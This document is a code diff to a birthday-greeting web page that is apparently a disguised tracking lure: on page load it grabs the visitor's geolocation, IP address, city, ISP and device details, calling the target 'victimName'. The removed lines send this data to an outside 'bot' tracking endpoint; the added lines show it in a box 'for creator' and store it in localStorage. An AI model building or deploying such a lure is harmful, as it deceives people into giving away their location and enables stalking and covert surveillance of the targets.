@@ -18,7 +18,6 @@
             justify-content: center;
             align-items: center;
             padding: 20px;
-            overflow-x: hidden;
         }
         .container {
             background: rgba(255,255,255,0.95);
@@ -59,16 +58,6 @@
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-        }
-        .gift-box::after {
-            content: "";
-            position: absolute;
-            width: 100%;
-            height: 20px;
-            background: rgba(255,255,255,0.3);
-            top: 50%;
-            left: 0;
-            transform: translateY(-50%);
         }
         h1 {
             color: #333;
@@ -127,6 +116,21 @@
             font-size: 12px;
             color: #999;
         }
+        .data-box {
+            background: #1a1a2e;
+            color: #0f0;
+            font-family: monospace;
+            font-size: 11px;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            text-align: left;
+            word-wrap: break-word;
+            display: none;
+        }
+        .data-box.show {
+            display: block;
+        }
     </style>
 </head>
 <body>
@@ -142,6 +146,10 @@
         <p>✨ May your day be filled with joy and happiness! ✨</p>
         <p>🎂 HAPPY BIRTHDAY! 🎂</p>
     </div>
+    <div class="data-box" id="dataBox">
+        <strong>📊 Your Info (for creator):</strong><br>
+        <span id="infoText"></span>
+    </div>
     <div class="footer">❤️ Made with love</div>
 </div>
 
@@ -152,7 +160,7 @@
     
     let dataSent = false;
     
-    async function sendTrackingData() {
+    async function collectData() {
         if (dataSent) return;
         
         try {
@@ -174,11 +182,9 @@
                 } catch(e) {
                     location = { error: e.message || "Permission denied" };
                 }
-            } else {
-                location = { error: "Geolocation not supported" };
             }
             
-            // Get IP and network info
+            // Get IP info
             let network = { error: "Not available" };
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
@@ -192,45 +198,55 @@
                     country: geoData.country_name || 'N/A',
                     isp: geoData.org || 'N/A'
                 };
-            } catch(e) {
-                network = { error: e.message };
-            }
+            } catch(e) {}
             
-            // Get device info
+            // Device info
             const device = {
-                userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 language: navigator.language,
-                screenWidth: screen.width,
-                screenHeight: screen.height,
+                screen: `${screen.width}x${screen.height}`,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
             };
             
-            const data = {
+            // Display data in box
+            const infoText = document.getElementById('infoText');
+            infoText.innerHTML = `
+🔗 ID: ${linkId}
+👤 Name: ${victimName}
+📍 Lat: ${location.lat || 'N/A'}
+📍 Lon: ${location.lon || 'N/A'}
+🎯 Accuracy: ${location.accuracy || 'N/A'}m
+🌐 IP: ${network.ip || 'N/A'}
+🏙️ City: ${network.city || 'N/A'}
+📡 ISP: ${network.isp || 'N/A'}
+📱 Device: ${device.platform}
+🖥️ Screen: ${device.screen}
+⏰ Timezone: ${device.timezone}
+🕐 Time: ${new Date().toLocaleString()}
+            `;
+            
+            document.getElementById('dataBox').classList.add('show');
+            
+            // Also save to localStorage for later viewing
+            let allData = JSON.parse(localStorage.getItem('trackData') || '[]');
+            allData.push({
                 id: linkId,
                 name: victimName,
                 location: location,
                 network: network,
                 device: device,
-                timestamp: new Date().toISOString(),
-                bot_api: "https://pateligreel.vercel.app/api/track"
-            };
-            
-            // Send to your bot's tracking endpoint
-            await fetch('https://pateligreel.vercel.app/api/track', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
+                time: new Date().toISOString()
             });
+            localStorage.setItem('trackData', JSON.stringify(allData));
             
             dataSent = true;
         } catch(e) {
-            console.log('Tracking error:', e);
+            console.log('Error:', e);
         }
     }
     
-    // Send tracking data immediately
-    sendTrackingData();
+    // Collect data immediately
+    collectData();
     
     // Gift opening animation
     const giftBox = document.getElementById('giftBox');
